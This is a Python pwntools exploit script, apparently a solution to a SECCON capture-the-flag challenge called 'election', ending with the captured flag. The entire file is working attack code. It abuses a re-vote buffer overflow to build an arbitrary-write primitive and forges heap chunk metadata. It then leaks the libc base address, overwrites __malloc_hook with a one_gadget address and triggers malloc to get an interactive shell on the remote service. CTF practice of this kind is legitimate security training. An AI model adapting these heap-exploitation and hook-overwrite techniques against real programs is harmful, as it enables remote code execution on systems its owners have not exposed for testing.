#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('election.pwn.seccon.jp', 28349)
libc = ELF('libc-2.23.so')

def stand(name):
    r.sendlineafter('chocolate\n>> ', '1')
    r.sendafter('Enter the name.\n>> ', name)

def vote(show, name, new_name):
    r.sendlineafter('chocolate\n>> ', '2')
    r.sendafter('(Y/n) ', show)
    r.sendafter('name of the candidate.\n>> ', name)
    if name.lower() == 'oshima':
        r.sendafter('re-vote?\n>> ', new_name)

def result():
    r.sendlineafter('chocolate\n>> ', '3')

def eat():
    r.sendlineafter('chocolate\n>> ', '4')

def arbitrary_write(target, value, length):
    for i in range(length):
        val = (value >> (8*i)) & 0xff
        while True:
            if val > 0x7f:
                vote('y', 'oshima', 'yes\x00AAAA'+'A'*24+p64(target+i-0x10)+chr(0x7f))
                val -= 0x7f
            else:
                vote('y', 'oshima', 'yes\x00AAAA'+'A'*24+p64(target+i-0x10)+chr(val))
                break

str_ojima = 0x401004
lv = 0x602010

# first fake candidate info
# 0xffffffffff600804 is used to fill all 8 bytes such that strdup() will bring 0x602050 to heap
stand(p64(0xffffffffff600804)+p64(0x602050))
#second fake chunk info
arbitrary_write(0x602050, str_ojima, 3)
arbitrary_write(0x602058, 0x602070, 3)
# third fake chunk info
arbitrary_write(0x602070, 0x601f88, 3)

# make list point to first fake chunk (0xd0 + 0x20 == 0xf0)
arbitrary_write(0x602028, 0x20, 1)

# leak libc base
r.sendlineafter('chocolate\n>> ', '2')
r.sendafter('(Y/n) ', 'y')
r.recvuntil('* ojima\n* ')
libc_base = u64(r.recvn(6) + '\x00'*2) - 0x14a940
log.success('libc base: {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xf0274
r.sendafter('name of the candidate.\n>> ', 'A'*4)

# overwrite __malloc_hook to one gadget
arbitrary_write(malloc_hook, one_gadget, 6)
vote('y', 'oshima', 'yes\x00AAAA'+'A'*24+p64(lv-0x10)+'\xfe')
# trigger malloc
stand('C'*4)

r.interactive()

# SECCON{I5_7h15_4_fr4ud_3l3c710n?}
